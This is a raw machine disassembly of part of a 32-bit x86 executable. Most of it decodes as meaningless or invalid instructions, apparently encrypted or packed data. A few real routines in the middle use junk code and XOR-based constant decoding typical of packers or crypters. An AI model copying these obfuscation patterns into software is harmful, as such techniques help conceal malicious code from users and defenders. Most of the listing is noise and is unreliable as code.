  40f3ef:	lods   eax,DWORD PTR ds:[esi]
  40f3f0:	xchg   ecx,eax
  40f3f1:	sub    dh,BYTE PTR [esi]
  40f3f3:	mov    ch,0x65
  40f3f5:	pop    edx
  40f3f6:	add    dl,ch
  40f3f8:	lea    ebx,[edx]
  40f3fa:	test   dh,al
  40f3fc:	aas    
  40f3fd:	cmp    bh,BYTE PTR [edi-0x5b]
  40f400:	(bad)  
  40f401:	jp     0x40f3fa
  40f403:	mov    edx,0xa5f1a2da
  40f408:	and    BYTE PTR [ebx+eiz*4-0x2df98716],dh
  40f40f:	cdq    
  40f410:	cmp    BYTE PTR ds:0x64c94d1,ch
  40f416:	in     al,0xf7
  40f418:	xor    dh,0xf5
  40f41b:	retf   
  40f41c:	stos   BYTE PTR es:[edi],al
  40f41d:	clc    
  40f41e:	mov    esi,0x88971ac1
  40f423:	pop    ebp
  40f424:	int3   
  40f425:	test   al,0x6c
  40f427:	sub    al,0xa0
  40f429:	imul   esp,DWORD PTR [ecx+0x50],0x69f3d48a
  40f430:	cs into 
  40f432:	pop    eax
  40f433:	jmp    0xc1da:0xc151af23
  40f43a:	loopne 0x40f3d8
  40f43c:	mov    al,ds:0x5d8ba3f9
  40f441:	cs inc esp
  40f443:	lods   eax,DWORD PTR fs:[esi]
  40f445:	pop    esi
  40f446:	fcmovb st,st(1)
  40f448:	mov    dh,0x9b
  40f44a:	mov    bh,BYTE PTR [edi-0x50]
  40f44d:	xor    eax,0x55d853c5
  40f452:	mov    BYTE PTR [eax-0x11],bh
  40f455:	and    BYTE PTR [edx],ch
  40f457:	xchg   esi,eax
  40f458:	pop    esp
  40f459:	push   edx
  40f45a:	xchg   edi,eax
  40f45b:	push   ecx
  40f45c:	mov    ch,0x5e
  40f45e:	cmp    al,0x85
  40f460:	push   ecx
  40f461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f462:	lahf   
  40f463:	inc    esp
  40f464:	mov    dl,0x35
  40f466:	fwait
  40f467:	push   eax
  40f468:	mov    bl,0x5b
  40f46a:	out    0xe4,al
  40f46c:	xor    al,0xfc
  40f46e:	push   0xcc346155
  40f473:	pop    esp
  40f474:	push   ebp
  40f475:	or     BYTE PTR [edx-0xf],ah
  40f478:	std    
  40f479:	and    ebx,edi
  40f47b:	push   ebx
  40f47c:	out    0x75,al
  40f47e:	enter  0x8893,0x34
  40f482:	pushf  
  40f483:	not    DWORD PTR [eax+0x2e]
  40f486:	je     0x40f4c6
  40f488:	dec    eax
  40f489:	aaa    
  40f48a:	fadd   QWORD PTR [eax+0x1]
  40f48d:	cld    
  40f48e:	cwde   
  40f48f:	retf   0x6d70
  40f492:	push   0x7
  40f494:	arpl   si,si
  40f496:	popa   
  40f497:	jl     0x40f4ee
  40f499:	les    ebx,FWORD PTR [ebx+0x4d]
  40f49c:	out    dx,eax
  40f49d:	mov    cl,0x52
  40f49f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4a0:	xchg   DWORD PTR [ebx],edi
  40f4a2:	das    
  40f4a3:	lea    esi,[ebx+0x5]
  40f4a6:	push   esi
  40f4a7:	loopne 0x40f457
  40f4a9:	and    bh,ah
  40f4ab:	mov    ebx,0xccfa1080
  40f4b0:	daa    
  40f4b1:	sbb    BYTE PTR [ebx],bl
  40f4b3:	adc    eax,esi
  40f4b5:	dec    edx
  40f4b6:	dec    edi
  40f4b7:	xor    esp,DWORD PTR [ebx]
  40f4b9:	pop    ss
  40f4ba:	sar    BYTE PTR [esp+0x3ecf93bf],cl
  40f4c1:	inc    esi
  40f4c2:	add    bh,dh
  40f4c4:	inc    ebx
  40f4c5:	dec    eax
  40f4c6:	ss and ah,dh
  40f4c9:	mov    ch,0xcd
  40f4cb:	push   cs
  40f4cc:	mov    BYTE PTR [esi],ah
  40f4ce:	scas   eax,DWORD PTR es:[edi]
  40f4cf:	xor    bl,BYTE PTR [ecx-0x32]
  40f4d2:	inc    esp
  40f4d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4d4:	fldcw  WORD PTR [edx+ebp*1+0x2de69e59]
  40f4db:	dec    esp
  40f4dc:	jmp    0x90a6:0x1e26280d
  40f4e3:	push   ss
  40f4e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4e5:	inc    ebx
  40f4e6:	ja     0x40f532
  40f4e8:	sbb    al,BYTE PTR [ebp+0x69]
  40f4eb:	jle    0x40f523
  40f4ed:	ins    BYTE PTR es:[edi],dx
  40f4ee:	mov    ah,0x90
  40f4f0:	jge    0x40f55c
  40f4f2:	adc    bh,BYTE PTR ds:0x517a4047
  40f4f8:	leave  
  40f4f9:	mov    eax,0x753b9fa9
  40f4fe:	inc    ebp
  40f4ff:	sti    
  40f500:	outs   dx,DWORD PTR ds:[esi]
  40f501:	push   es
  40f502:	int3   
  40f503:	lahf   
  40f504:	mov    ch,0xd6
  40f506:	in     ax,0x7d
  40f509:	jmp    FWORD PTR [esi-0x27ec080d]
  40f50f:	sub    bh,ch
  40f511:	adc    bh,BYTE PTR [eax+0x24]
  40f514:	hlt    
  40f515:	std    
  40f516:	ja     0x40f4b4
  40f518:	call   0x56db:0xeaa5311
  40f51f:	imul   esp,DWORD PTR [esi+0x3d],0xffffffdf
  40f523:	sbb    ah,BYTE PTR [edx]
  40f525:	ret    
  40f526:	(bad)  
  40f527:	xor    edx,eax
  40f529:	and    eax,0x4decd4e1
  40f52e:	pop    esp
  40f52f:	mov    cl,0xf2
  40f531:	inc    ebp
  40f532:	arpl   WORD PTR [edx],bp
  40f534:	and    cl,BYTE PTR [edi-0x75ecfd50]
  40f53a:	push   0x61
  40f53c:	pop    ebp
  40f53d:	jo     0x40f5b1
  40f53f:	mov    al,0xe1
  40f541:	or     dh,bh
  40f543:	(bad)  
  40f544:	pop    ecx
  40f545:	stos   BYTE PTR es:[edi],al
  40f546:	xor    edx,edx
  40f548:	sbb    al,0xdd
  40f54a:	int3   
  40f54b:	inc    ecx
  40f54c:	lds    ebp,FWORD PTR [esi]
  40f54e:	nop
  40f54f:	test   esp,esp
  40f551:	jle    0x40f50a
  40f553:	hlt    
  40f554:	sub    eax,DWORD PTR [edi+0x37]
  40f557:	inc    esp
  40f558:	xor    ch,ah
  40f55a:	jne    0x40f5ca
  40f55c:	daa    
  40f55d:	jl     0x40f51b
  40f55f:	adc    dh,BYTE PTR [ecx+0x44]
  40f562:	push   edi
  40f563:	pop    edx
  40f564:	add    ebx,ebp
  40f566:	mov    BYTE PTR [edx+0x7a91fea7],dh
  40f56c:	js     0x40f56e
  40f56e:	pop    edx
  40f56f:	lock cmp al,0x88
  40f572:	push   ebp
  40f573:	addr16 cld 
  40f575:	(bad)  
  40f576:	mov    WORD PTR [edx-0x7],?
  40f579:	das    
  40f57a:	(bad)  
  40f57b:	adc    bh,BYTE PTR ds:0x59d11906
  40f581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f582:	daa    
  40f583:	hlt    
  40f584:	aam    0x9b
  40f586:	xor    al,0xf3
  40f588:	sub    DWORD PTR [ebx+0x67],0xfffffffa
  40f58c:	dec    ebp
  40f58d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f58e:	or     dh,BYTE PTR [edi]
  40f590:	retf   0xd771
  40f593:	stc    
  40f594:	xchg   edi,eax
  40f595:	mov    esp,cs
  40f597:	cmp    BYTE PTR [esi+0xa],al
  40f59a:	mov    al,ds:0x17ff0b39
  40f59f:	jno    0x40f545
  40f5a1:	mov    ah,0xea
  40f5a3:	and    edi,DWORD PTR [eax]
  40f5a5:	das    
  40f5a6:	pop    edx
  40f5a7:	sub    ebx,DWORD PTR [ebp-0x38948d25]
  40f5ad:	jmp    0x40f556
  40f5af:	pop    ss
  40f5b0:	scas   eax,DWORD PTR es:[edi]
  40f5b1:	clc    
  40f5b2:	daa    
  40f5b3:	mov    ebx,0xf64fee5
  40f5b8:	ret    0x41bd
  40f5bb:	in     al,dx
  40f5bc:	stos   BYTE PTR es:[edi],al
  40f5bd:	and    ecx,edx
  40f5bf:	std    
  40f5c0:	test   DWORD PTR [ecx+ebp*4+0xdc77fb1],ecx
  40f5c7:	inc    ebx
  40f5c8:	mov    edi,0x2cfb9569
  40f5cd:	adc    al,BYTE PTR ds:0x4a024237
  40f5d3:	add    bl,BYTE PTR [ecx+0x27]
  40f5d6:	adc    DWORD PTR ds:0x20ed3846,ecx
  40f5dc:	jnp    0x40f644
  40f5de:	jp     0x40f609
  40f5e0:	adc    ecx,ebx
  40f5e2:	add    esp,DWORD PTR [edx+eiz*2-0x14a55102]
  40f5e9:	push   ss
  40f5ea:	(bad)  
  40f5eb:	fimul  DWORD PTR [ebx+edx*4]
  40f5ee:	jns    0x40f5af
  40f5f0:	pop    eax
  40f5f1:	daa    
  40f5f2:	fsub   DWORD PTR ds:0xf2bebdb4
  40f5f8:	iret   
  40f5f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5fa:	inc    eax
  40f5fb:	shr    eax,1
  40f5fd:	ja     0x40f5b8
  40f5ff:	(bad)  
  40f600:	int3   
  40f601:	imul   edi,DWORD PTR [ecx],0xffffffb3
  40f604:	(bad)  
  40f605:	stc    
  40f606:	pop    ds
  40f607:	fxch   st(0)
  40f609:	retf   
  40f60a:	shr    BYTE PTR [ebp-0x44282de4],0xc4
  40f611:	hlt    
  40f612:	and    eax,0xbd0f26f5
  40f617:	stc    
  40f618:	fcom   QWORD PTR ds:0xbf8ffd93
  40f61e:	in     al,dx
  40f61f:	mov    edx,0x9023df59
  40f625:	sbb    al,0x2c
  40f627:	fldenv [ecx+0x1b]
  40f62a:	fst    QWORD PTR [ebx-0x54]
  40f62d:	ss icebp 
  40f62f:	and    ebx,0xffffffc3
  40f632:	leave  
  40f633:	mov    ch,0x62
  40f635:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f636:	sbb    eax,0xae5ce5aa
  40f63b:	xchg   edx,eax
  40f63c:	clc    
  40f63d:	std    
  40f63e:	lea    esi,[edx+edi*8+0x458f8da2]
  40f645:	lock iret 
  40f647:	aas    
  40f648:	or     eax,DWORD PTR [eax]
  40f64a:	in     eax,0x94
  40f64c:	cli    
  40f64d:	mov    eax,ds:0x796a5635
  40f652:	or     BYTE PTR [ecx],0xe3
  40f655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f656:	and    eax,0x66333b3
  40f65b:	cdq    
  40f65c:	mov    bh,0xee
  40f65e:	sub    al,0x4b
  40f660:	mov    esi,DWORD PTR [ecx-0x5b112bd7]
  40f666:	push   ebp
  40f667:	mov    ebx,0x2c7da106
  40f66c:	sbb    al,0xb5
  40f66e:	adc    eax,0xc399e8a8
  40f673:	outs   dx,BYTE PTR ds:[esi]
  40f674:	into   
  40f675:	test   al,0xa8
  40f677:	or     ah,BYTE PTR [ecx+0x5c04717e]
  40f67d:	push   ss
  40f67e:	dec    ebp
  40f67f:	(bad)  
  40f680:	adc    dl,cl
  40f682:	xchg   DWORD PTR [ebp-0x10],esi
  40f685:	xlat   BYTE PTR ds:[ebx]
  40f686:	xchg   edx,eax
  40f687:	xchg   ecx,eax
  40f688:	or     BYTE PTR [edi+0x28bb7e21],al
  40f68e:	sbb    eax,esp
  40f690:	mov    dh,0x4d
  40f692:	pop    esp
  40f693:	push   0x4c8974bd
  40f698:	mov    al,ds:0x23e4ed10
  40f69d:	mov    ah,0xd1
  40f69f:	int3   
  40f6a0:	mov    edi,0x7ed738cb
  40f6a5:	mov    esi,ebx
  40f6a7:	mov    al,ds:0x6efe4a1
  40f6ac:	test   BYTE PTR [edx-0xac2c8d],0x8f
  40f6b3:	xchg   ebx,eax
  40f6b4:	sbb    BYTE PTR [ebp+0x1904f4e0],dh
  40f6ba:	in     eax,dx
  40f6bb:	jmp    0xd2cc0f6e
  40f6c0:	imul   esp,DWORD PTR [ecx],0x59
  40f6c3:	push   0xffffffce
  40f6c5:	das    
  40f6c6:	js     0x40f733
  40f6c8:	shr    esi,0xff
  40f6cb:	lea    eax,[edx-0x1f388884]
  40f6d1:	call   0x79d88131
  40f6d6:	aam    0xbe
  40f6d8:	mov    ch,0xfc
  40f6da:	ror    bh,cl
  40f6dc:	test   DWORD PTR [ebx-0x5a],ecx
  40f6df:	jno    0x40f6a7
  40f6e1:	inc    BYTE PTR [ecx-0x5e54ad70]
  40f6e7:	mov    ebx,0xfd60f4a6
  40f6ec:	dec    ecx
  40f6ed:	jno    0x40f747
  40f6ef:	cmp    DWORD PTR [edi+esi*2],ebp
  40f6f2:	mov    eax,DWORD PTR [edx]
  40f6f4:	sub    dh,ch
  40f6f6:	pop    ecx
  40f6f7:	dec    edi
  40f6f8:	jmp    0x8ad3224
  40f6fd:	cmp    eax,0xd8a04801
  40f702:	js     0x40f6c7
  40f704:	(bad)  
  40f705:	cmc    
  40f706:	fisub  WORD PTR [edx]
  40f708:	dec    esi
  40f709:	jge    0x40f77f
  40f70b:	bound  edi,QWORD PTR [eax+0x9]
  40f70e:	adc    eax,0x3a3658a8
  40f713:	stos   DWORD PTR es:[edi],eax
  40f714:	loope  0x40f772
  40f716:	icebp  
  40f717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f718:	scas   eax,DWORD PTR es:[edi]
  40f719:	sbb    al,0xdc
  40f71b:	pop    ebp
  40f71c:	dec    esp
  40f71d:	fdiv   QWORD PTR [edi+0x442e7b3f]
  40f723:	jo     0x40f71e
  40f725:	pushf  
  40f726:	cmp    al,cl
  40f728:	dec    eax
  40f729:	fs js  0x40f6b9
  40f72c:	xor    al,0x7c
  40f72e:	cmc    
  40f72f:	and    ebx,eax
  40f731:	adc    al,0xea
  40f733:	enter  0x3c7f,0xce
  40f737:	bound  ecx,QWORD PTR [ebp+0x1a]
  40f73a:	cmp    cl,cl
  40f73c:	rcr    DWORD PTR [esi],cl
  40f73e:	shr    DWORD PTR [ecx+0x1ed15a31],cl
  40f744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f745:	mov    dh,0xa9
  40f747:	leave  
  40f748:	out    0xe7,al
  40f74a:	push   esi
  40f74b:	popa   
  40f74c:	adc    bl,BYTE PTR [edi+esi*1]
  40f74f:	jbe    0x40f719
  40f751:	inc    ebx
  40f752:	and    ch,al
  40f754:	adc    dh,BYTE PTR [ebp+0x4f]
  40f757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f758:	xchg   ebp,eax
  40f759:	ror    eax,cl
  40f75b:	sub    DWORD PTR [ebx],ebp
  40f75d:	pop    eax
  40f75e:	lods   al,BYTE PTR ds:[esi]
  40f75f:	dec    ebp
  40f760:	aad    0xea
  40f762:	mov    WORD PTR [edi-0x192d22b2],es
  40f768:	dec    ebp
  40f769:	cs das 
  40f76b:	mov    al,0xf5
  40f76d:	sbb    eax,0x7b68dcef
  40f772:	out    0xdd,eax
  40f774:	lock add BYTE PTR ds:0x24c62aa8,ah
  40f77b:	bound  eax,QWORD PTR [esi+0x5e]
  40f77e:	mov    bl,0x12
  40f780:	hlt    
  40f781:	out    0x98,al
  40f783:	ss pop es
  40f785:	sub    BYTE PTR [eax],0x30
  40f788:	jle    0x40f775
  40f78a:	scas   al,BYTE PTR es:[edi]
  40f78b:	pop    esp
  40f78c:	clc    
  40f78d:	sbb    ch,BYTE PTR [ebp+0x6f2e6e45]
  40f793:	xor    al,0xa1
  40f795:	mov    ebx,0xb426de87
  40f79a:	lock sbb esp,DWORD PTR [eax]
  40f79d:	xchg   edx,eax
  40f79e:	std    
  40f79f:	mov    edx,0x1f6622d1
  40f7a4:	sbb    DWORD PTR [ecx],ebp
  40f7a6:	xchg   ecx,eax
  40f7a7:	add    bh,BYTE PTR [esi]
  40f7a9:	mov    ds:0x1fefdda5,eax
  40f7ae:	inc    esp
  40f7af:	inc    edi
  40f7b0:	call   0xa980:0x6aaef186
  40f7b7:	pop    ebp
  40f7b8:	imul   ebx,DWORD PTR [ebx+0xb],0xffffff9c
  40f7bc:	xor    eax,0x7b0a3817
  40f7c1:	in     eax,dx
  40f7c2:	adc    BYTE PTR [ecx-0x19f2c7fd],al
  40f7c8:	enter  0x358e,0x83
  40f7cc:	test   DWORD PTR [eax+edx*4],0x1024a29f
  40f7d3:	ins    BYTE PTR es:[edi],dx
  40f7d4:	xacquire xchg DWORD PTR cs:[edx],ecx
  40f7d8:	push   ecx
  40f7d9:	cwde   
  40f7da:	test   bh,cl
  40f7dc:	idiv   BYTE PTR [ebp+0x7d]
  40f7df:	scas   al,BYTE PTR es:[edi]
  40f7e0:	js     0x40f81e
  40f7e2:	or     dl,BYTE PTR [ecx+0x56]
  40f7e5:	cmp    BYTE PTR [ebx],bl
  40f7e7:	sbb    ecx,edx
  40f7e9:	mov    cl,0x99
  40f7eb:	jecxz  0x40f841
  40f7ed:	jb     0x40f77b
  40f7ef:	xchg   BYTE PTR [edi],bl
  40f7f1:	je     0x40f82b
  40f7f3:	sar    DWORD PTR [edi+0x22],cl
  40f7f6:	aam    0xf3
  40f7f8:	bound  ebx,QWORD PTR [ecx+0x36]
  40f7fb:	aaa    
  40f7fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7fd:	fmulp  st(5),st
  40f7ff:	add    eax,0x1802ea17
  40f804:	jp     0x40f841
  40f806:	das    
  40f807:	jne    0x40f7d1
  40f809:	xor    bh,ch
  40f80b:	fs shl eax,cl
  40f80e:	or     al,0xee
  40f810:	jbe    0x40f87a
  40f812:	stos   DWORD PTR es:[edi],eax
  40f813:	loope  0x40f7f8
  40f815:	push   es
  40f816:	cmp    BYTE PTR ds:0x91187801,al
  40f81c:	test   BYTE PTR [eax+0x53],dh
  40f81f:	sbb    esp,DWORD PTR [ecx+0x57]
  40f822:	dec    esp
  40f823:	inc    ecx
  40f824:	rol    DWORD PTR [ebp-0x2b3c5dfd],0x21
  40f82b:	scas   al,BYTE PTR es:[edi]
  40f82c:	xchg   DWORD PTR [eax+0x51],ebp
  40f82f:	out    dx,eax
  40f830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f831:	ret    
  40f832:	lods   eax,DWORD PTR ds:[esi]
  40f833:	mov    dl,0x7d
  40f835:	xchg   ebx,eax
  40f836:	sahf   
  40f837:	mov    ds:0x3e946284,eax
  40f83c:	jnp    0x40f848
  40f83e:	push   edi
  40f83f:	jae    0x40f89b
  40f841:	les    esi,FWORD PTR [esi]
  40f843:	push   edi
  40f844:	in     eax,dx
  40f845:	sub    bh,BYTE PTR [edi]
  40f847:	push   ebx
  40f848:	push   ds
  40f849:	aaa    
  40f84a:	in     eax,0xb0
  40f84c:	sbb    BYTE PTR [ebp+esi*1-0xa],bh
  40f850:	(bad)  
  40f851:	dec    BYTE PTR [eax]
  40f853:	popf   
  40f854:	xchg   ecx,eax
  40f855:	dec    eax
  40f856:	xchg   ecx,eax
  40f857:	dec    ecx
  40f858:	xchg   ecx,edx
  40f85a:	dec    edx
  40f85b:	push   edx
  40f85c:	mov    edx,ebx
  40f85e:	pop    ebx
  40f85f:	dec    ebx
  40f860:	call   DWORD PTR [ebx]
  40f862:	cmp    DWORD PTR [ebp+0x10],esi
  40f865:	je     0x40f884
  40f86b:	xchg   edx,eax
  40f86c:	push   0xb
  40f86e:	pop    ecx
  40f86f:	push   0x4
  40f871:	pop    ebx
  40f872:	inc    ebx
  40f873:	xchg   ebx,ecx
  40f875:	sub    ebx,ecx
  40f877:	xchg   ebx,ecx
  40f879:	dec    ecx
  40f87a:	dec    ecx
  40f87b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f87e:	imul   eax,ecx
  40f881:	add    esp,eax
  40f883:	xchg   edx,eax
  40f884:	push   eax
  40f885:	xor    ebx,ebx
  40f887:	mov    edx,esp
  40f889:	dec    edx
  40f88a:	inc    ebx
  40f88b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f88e:	dec    ebx
  40f88f:	xor    edx,edx
  40f891:	add    DWORD PTR [ebp-0xc],ebx
  40f894:	pop    ebx
  40f895:	mov    eax,DWORD PTR [ebp-0xc]
  40f898:	pop    edi
  40f899:	pop    esi
  40f89a:	pop    ebx
  40f89b:	leave  
  40f89c:	ret    0x10
  40f89f:	push   ebp
  40f8a0:	mov    ebp,esp
  40f8a2:	push   ecx
  40f8a3:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  40f8aa:	add    DWORD PTR ds:0x42c010,0x33e6
  40f8b4:	mov    eax,DWORD PTR [ebp-0x4]
  40f8b7:	or     edx,ecx
  40f8b9:	mov    edx,DWORD PTR [ebp+0x10]
  40f8bc:	mov    ecx,0x7510893
  40f8c1:	xor    eax,ecx
  40f8c3:	and    DWORD PTR ds:0x42d008,0x1b89
  40f8cd:	add    eax,0x3272db
  40f8d2:	or     DWORD PTR ds:0x42a01c,0x429008
  40f8dc:	mov    DWORD PTR [edx],eax
  40f8de:	and    DWORD PTR ds:0x42c01c,0x0
  40f8e8:	xor    eax,eax
  40f8ea:	add    eax,DWORD PTR ds:0x42c01c
  40f8f0:	inc    eax
  40f8f1:	mov    ds:0x42c01c,eax
  40f8f6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f8fd:	jne    0x40f90f
  40f903:	push   DWORD PTR [ebp-0x20]
  40f906:	push   DWORD PTR [ebp-0x20]
  40f909:	call   DWORD PTR ds:0x425034
  40f90f:	cmp    DWORD PTR ds:0x42c01c,0x1d
  40f916:	jb     0x40f8e8
  40f91c:	and    DWORD PTR ds:0x42d01c,0x0
  40f926:	jmp    0x40f938
  40f92b:	mov    edx,DWORD PTR ds:0x42d01c
  40f931:	inc    edx
  40f932:	mov    DWORD PTR ds:0x42d01c,edx
  40f938:	cmp    DWORD PTR ds:0x42d01c,0x1b
  40f93f:	jae    0x40f96c
  40f945:	cmp    DWORD PTR ds:0x42d01c,0x1d
  40f94c:	jne    0x40f967
  40f952:	push   0x42454c
  40f957:	push   0x4244fc
  40f95c:	push   0x42c7
  40f961:	call   DWORD PTR ds:0x42503c
  40f967:	jmp    0x40f92b
  40f96c:	mov    eax,DWORD PTR [ebp+0xc]
  40f96f:	xor    eax,ecx
  40f971:	push   esi
  40f972:	mov    esi,DWORD PTR [ebp+0x10]
  40f975:	mov    edx,0x3272db
  40f97a:	add    eax,edx
  40f97c:	mov    DWORD PTR [esi+0x4],eax
  40f97f:	mov    eax,DWORD PTR [ebp+0x14]
  40f982:	mov    esi,DWORD PTR [ebp+0x10]
  40f985:	mov    DWORD PTR [esi+0x8],eax
  40f988:	mov    eax,DWORD PTR [ebp+0x18]
  40f98b:	mov    esi,DWORD PTR [ebp+0x10]
  40f98e:	mov    DWORD PTR [esi+0xc],eax
  40f991:	mov    eax,DWORD PTR [ebp+0x1c]
  40f994:	mov    esi,DWORD PTR [ebp+0x10]
  40f997:	mov    DWORD PTR [esi+0x10],eax
  40f99a:	mov    eax,DWORD PTR [ebp+0x8]
  40f99d:	xor    eax,ecx
  40f99f:	add    eax,edx
  40f9a1:	pop    esi
  40f9a2:	leave  
  40f9a3:	ret    0x18
  40f9a6:	push   ebp
  40f9a7:	mov    ebp,esp
  40f9a9:	mov    eax,ds:0x423ff2
  40f9ae:	mov    eax,DWORD PTR [eax+0x1c8]
  40f9b4:	mov    eax,DWORD PTR [eax]
  40f9b6:	movzx  ecx,BYTE PTR ds:0x429000
  40f9bd:	and    DWORD PTR ds:0x42d010,ecx
  40f9c3:	cdq    
  40f9c4:	push   ebx
  40f9c5:	add    DWORD PTR ds:0x42a008,0x429020
  40f9cf:	mov    ecx,0xfabdbef1
  40f9d4:	add    eax,ecx
  40f9d6:	mov    DWORD PTR ds:0x42d008,0x7e66
  40f9e0:	adc    edx,0xffffffff
  40f9e3:	or     DWORD PTR ds:0x42a014,edi
  40f9e9:	push   esi
  40f9ea:	push   edi
  40f9eb:	and    DWORD PTR ds:0x42a00c,0x0
  40f9f5:	jmp    0x40fa09
  40f9fa:	xor    ebx,ebx
  40f9fc:	or     ebx,DWORD PTR ds:0x42a00c
  40fa02:	inc    ebx
  40fa03:	mov    DWORD PTR ds:0x42a00c,ebx
  40fa09:	cmp    DWORD PTR ds:0x42a00c,0x1b
  40fa10:	jae    0x40fa41
  40fa16:	cmp    DWORD PTR ds:0x42a00c,0x26
  40fa1d:	jne    0x40fa36
  40fa23:	push   0x7619
  40fa28:	push   0x3c20
  40fa2d:	push   DWORD PTR [ebp-0x18]
  40fa30:	call   DWORD PTR ds:0x425040
  40fa36:	jmp    0x40f9fa
  40fa3b:	adc    ebx,DWORD PTR ds:0x42d018
  40fa41:	mov    edi,edx
  40fa43:	mov    edx,DWORD PTR [ebp+0x8]
  40fa46:	mov    DWORD PTR ds:0x42c000,0x5718
  40fa50:	mov    ebx,eax
  40fa52:	and    DWORD PTR ds:0x42c004,0x67ab
  40fa5c:	mov    eax,0x8a29a123
  40fa61:	xor    esi,esi
  40fa63:	or     DWORD PTR ds:0x429024,0x42d014
  40fa6d:	xor    ebx,eax
  40fa6f:	or     DWORD PTR ds:0x42d000,0x42a014
  40fa79:	xor    edi,0x0
  40fa7c:	and    DWORD PTR ds:0x42d000,0x42a00c
  40fa86:	add    edx,ecx
  40fa88:	adc    esi,0xffffffff
  40fa8b:	xor    edx,eax
  40fa8d:	or     DWORD PTR ds:0x42c010,0x42b010
  40fa97:	jmp    0x411e4e
  40fa9c:	mov    WORD PTR [ebx+0x6643964b],?
  40faa2:	arpl   WORD PTR [ebx+0x42],sp
  40faa5:	jno    0x40fa92
  40faa7:	rcr    BYTE PTR [ebx],cl
  40faa9:	cmp    al,0xe8
  40faab:	xor    al,0x78
  40faad:	mov    fs,WORD PTR [edx+0x62]
  40fab0:	enter  0x625f,0x62
  40fab4:	or     eax,0x17005e6c
  40fab9:	jns    0x40faa2
  40fabb:	sbb    eax,0x73a3b017
  40fac0:	sub    al,bh
  40fac2:	imul   esp,DWORD PTR cs:[ebx-0x2],0x8194853b
  40faca:	cli    
  40facb:	adc    dh,al
  40facd:	mov    bh,0x6e
  40facf:	imul   ebx,DWORD PTR [esi+ecx*1+0x43],0x271721be
  40fad7:	call   0x18cd:0x6139fcac
  40fade:	daa    
  40fadf:	add    eax,edi
  40fae1:	cmp    BYTE PTR [ebp-0x1edd4e9c],dl
  40fae7:	mov    esi,0x74279356
  40faec:	adc    eax,0xe1641be
  40faf1:	mov    ebp,0x6bf3a1eb
  40faf6:	call   0x3c70:0xba8e2d49
  40fafd:	add    BYTE PTR [esi-0x7a],ah
  40fb00:	xor    BYTE PTR [ecx+0x4b],ah
  40fb03:	mov    ss,WORD PTR [edx-0x13a54746]
  40fb09:	pop    ds
  40fb0a:	aad    0xec
  40fb0c:	call   FWORD PTR [eax+0x312f4b93]
  40fb12:	inc    edx
  40fb13:	lea    esp,[ebp+ecx*2+0x5ef94de7]
  40fb1a:	jecxz  0x40fb92
  40fb1c:	push   ebx
  40fb1d:	jmp    0xe497:0xfca8a004
  40fb24:	jo     0x40faac
  40fb26:	(bad)  [esi-0x9]
  40fb29:	sbb    edi,ebx
  40fb2b:	inc    esp
  40fb2c:	push   0xffffff99
  40fb2e:	cld    
  40fb2f:	inc    eax
  40fb30:	cdq    
  40fb31:	int    0xa1
  40fb33:	sub    BYTE PTR [eax-0x1418a56d],ah
  40fb39:	push   es
  40fb3a:	and    ebp,DWORD PTR [ecx+0x27]
  40fb3d:	sub    ah,0x5f
  40fb40:	stos   BYTE PTR es:[edi],al
  40fb41:	out    dx,eax
  40fb42:	jecxz  0x40fb2d
  40fb44:	xchg   esp,eax
  40fb45:	pop    ss
  40fb46:	mov    al,0x6d
  40fb48:	sbb    al,0xd6
  40fb4a:	xchg   BYTE PTR [ecx-0x29],bh
  40fb4d:	jmp    0x40fb3b
  40fb4f:	repnz push esi
  40fb51:	jae    0x40fbb7
  40fb53:	xchg   esi,eax
  40fb54:	call   0xbb767528
  40fb59:	loope  0x40fbbd
  40fb5b:	xor    al,0xa6
  40fb5d:	pop    edi
  40fb5e:	jge    0x40fb7b
  40fb60:	ret    0x9744
  40fb63:	push   ds
  40fb64:	xchg   esi,eax
  40fb65:	xor    BYTE PTR [ebp+0x37f06844],bh
  40fb6b:	ret    0x82b5
  40fb6e:	or     al,0x20
  40fb70:	cmp    BYTE PTR [edx],bh
  40fb72:	or     ah,BYTE PTR [eax+0x23]
  40fb75:	lods   eax,DWORD PTR ds:[esi]
  40fb76:	or     dl,BYTE PTR [ebp-0xba6b8f1]
  40fb7c:	js     0x40fb98
  40fb7e:	add    esp,DWORD PTR [esp+edi*4-0x23]
  40fb82:	test   al,0x94
  40fb84:	dec    ebx
  40fb85:	xchg   edx,eax
  40fb86:	or     esp,edi
  40fb88:	dec    eax
  40fb89:	(bad)  
  40fb8a:	sti    
  40fb8b:	pop    ecx
  40fb8c:	mov    dh,0x8f
  40fb8e:	(bad)  
  40fb8f:	mov    dh,0x76
  40fb91:	or     ecx,DWORD PTR ds:0x2ba0fcad
  40fb97:	jb     0x40fbe4
  40fb99:	xor    esp,DWORD PTR [ebp-0x7c]
  40fb9c:	mov    WORD PTR [eax+0x6b1255f0],cs
  40fba2:	imul   DWORD PTR [esi+eax*4-0x1]
  40fba6:	lock lahf 
  40fba8:	xor    BYTE PTR [ebp+eax*2+0x1b778966],dl
  40fbaf:	dec    ebx
  40fbb0:	das    
  40fbb1:	sub    eax,0x6a47a63e
  40fbb6:	jae    0x40fbd5
  40fbb8:	cmp    al,BYTE PTR [eax]
  40fbba:	hlt    
  40fbbb:	dec    esp
  40fbbc:	sub    edx,DWORD PTR [ecx+0x69]
  40fbbf:	into   
  40fbc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbc1:	shl    edx,1
